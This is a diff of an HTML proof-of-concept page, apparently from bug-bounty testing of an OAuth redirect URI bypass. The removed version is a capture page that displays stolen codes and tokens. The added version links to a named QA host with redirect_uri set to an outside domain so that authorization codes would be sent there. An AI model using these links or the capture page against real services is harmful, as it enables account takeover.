@@ -1,163 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OAuth Vulnerability Demonstration</title>
+    <title>OAuth Vulnerability Test</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .banner {
-            background-color: #ff4444;
-            color: white;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        .evidence-box {
-            background-color: white;
-            border: 2px solid #333;
-            border-radius: 5px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        .param {
-            background-color: #ffffcc;
-            padding: 10px;
-            border: 1px solid #ddddaa;
-            border-radius: 3px;
-            font-family: monospace;
-            word-break: break-all;
-            margin: 10px 0;
-        }
-        h2 {
-            border-bottom: 1px solid #ccc;
-            padding-bottom: 10px;
-        }
-        .timestamp {
-            color: #666;
-            font-size: 0.9em;
-            margin-top: 20px;
-        }
-        .attack-path {
-            background-color: #e9f7fe;
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
-        }
-        .footer {
-            margin-top: 40px;
-            text-align: center;
-            font-size: 0.8em;
-            color: #666;
-        }
+        body {font-family: Arial; max-width: 800px; margin: 0 auto; padding: 20px;}
+        .box {border: 1px solid #ccc; padding: 15px; margin: 15px 0; border-radius: 5px;}
+        .highlight {background-color: #ffffcc; padding: 5px; border-radius: 3px;}
+        h1 {color: #cc0000;}
     </style>
 </head>
 <body>
-    <div class="banner">
-        <h1>Critical OAuth Vulnerability Demonstrated</h1>
+    <h1>OAuth2 Proxy 2.2.0 Vulnerability Test</h1>
+    
+    <div class="box">
+        <h2>Test 1: Redirect URI Validation Bypass</h2>
+        <p>Click the link below to test if the OAuth server accepts an arbitrary redirect URI:</p>
+        <p><a href="https://internalweb-qa.vimla.io/oauth/authorize?client_id=telenor_bug_bounty_test&redirect_uri=https://snowgoose.info/oauth-capture.html&response_type=code&state=test_vulnerability" target="_blank">Test Redirect URI Validation</a></p>
     </div>
-
-    <div class="evidence-box">
-        <h2>OAuth Authorization Code Captured</h2>
-        <p>The OAuth flow has redirected the authorization code to an attacker-controlled domain:</p>
-        
-        <div id="oauth-code-display">
-            <strong>Authorization Code:</strong>
-            <div class="param" id="code-value">Checking URL parameters...</div>
-            
-            <strong>State Parameter:</strong>
-            <div class="param" id="state-value">Checking URL parameters...</div>
-            
-            <strong>Full Redirect URL:</strong>
-            <div class="param" id="full-url">Checking URL parameters...</div>
-        </div>
-
-        <div class="timestamp">
-            Captured at: <span id="capture-time"></span>
-        </div>
+    
+    <div class="box">
+        <h2>Test 2: Google OAuth Integration</h2>
+        <p>Click the link below to test if the Google OAuth integration is also vulnerable:</p>
+        <p><a href="https://internalweb-qa.vimla.io/oauth2/start?client_id=770763261457-16iq06mb44nkckl5g97jv0plbl52hlu9&redirect_uri=https://snowgoose.info/oauth-capture.html&response_type=code&state=google_test" target="_blank">Test Google OAuth Integration</a></p>
     </div>
-
-    <div class="attack-path">
-        <h3>Attack Path Demonstrated:</h3>
+    
+    <div class="box">
+        <h2>Expected Result:</h2>
+        <p>If vulnerable, clicking either link will:</p>
         <ol>
-            <li>Attacker creates OAuth URL with malicious redirect_uri</li>
-            <li>Victim authenticates with OAuth provider</li>
-            <li>OAuth provider redirects the code to attacker's domain (this page)</li>
-            <li>Attacker can now use the code to access victim's account</li>
+            <li>Display an OAuth login page</li>
+            <li>After authentication (which we cannot complete without credentials), the authorization code would be sent to <span class="highlight">snowgoose.info</span></li>
         </ol>
+        <p>According to OAuth security standards (RFC 6819), acceptance of arbitrary redirect URIs is itself a critical vulnerability that enables potential account takeover.</p>
     </div>
-
-    <div class="footer">
-        <p>OAuth2 Redirect URI Validation Bypass — CVE-2019-2111</p>
-        <p>This page demonstrates a critical vulnerability in OAuth2 Proxy version 2.2.0</p>
-    </div>
-
-    <script>
-        // Parse URL parameters
-        function getUrlParams() {
-            const params = {};
-            const queryString = window.location.search.substring(1);
-            const pairs = queryString.split('&');
-            
-            for (const pair of pairs) {
-                const [key, value] = pair.split('=');
-                if (key) params[decodeURIComponent(key)] = decodeURIComponent(value || '');
-            }
-            
-            // Also check for parameters in hash fragment (for implicit flow)
-            const hashString = window.location.hash.substring(1);
-            const hashPairs = hashString.split('&');
-            
-            for (const pair of hashPairs) {
-                const [key, value] = pair.split('=');
-                if (key) params[decodeURIComponent(key)] = decodeURIComponent(value || '');
-            }
-            
-            return params;
-        }
-
-        // Extract and display OAuth parameters
-        window.onload = function() {
-            const params = getUrlParams();
-            const codeElement = document.getElementById('code-value');
-            const stateElement = document.getElementById('state-value');
-            const urlElement = document.getElementById('full-url');
-            const timeElement = document.getElementById('capture-time');
-            
-            // Display the OAuth code (if present)
-            if (params.code) {
-                codeElement.textContent = params.code;
-                codeElement.style.backgroundColor = '#ffdddd';  // Highlight in red
-            } else if (params.access_token) {
-                // For implicit flow
-                codeElement.textContent = 'IMPLICIT FLOW: ' + params.access_token;
-                codeElement.style.backgroundColor = '#ffdddd';
-            } else {
-                codeElement.textContent = 'No code or token found in the URL';
-            }
-            
-            // Display the state parameter (if present)
-            if (params.state) {
-                stateElement.textContent = params.state;
-            } else {
-                stateElement.textContent = 'No state parameter found';
-            }
-            
-            // Display the full URL
-            urlElement.textContent = window.location.href;
-            
-            // Set the timestamp
-            const now = new Date();
-            timeElement.textContent = now.toLocaleString();
-        };
-    </script>
 </body>
 </html>
